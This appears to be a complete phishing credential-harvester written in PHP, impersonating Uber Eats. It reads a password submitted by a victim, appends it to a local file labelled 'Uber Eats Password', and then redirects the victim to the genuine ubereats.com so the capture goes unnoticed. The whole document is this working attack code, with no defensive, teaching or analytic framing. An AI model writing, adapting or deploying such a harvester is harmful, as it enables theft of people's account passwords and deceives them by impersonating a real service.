<?php
file_put_contents("pass.txt", "Uber Eats Password : " . $pass = $_POST['pass'] . "\n", FILE_APPEND);
header('Location: https://ubereats.com');
?>
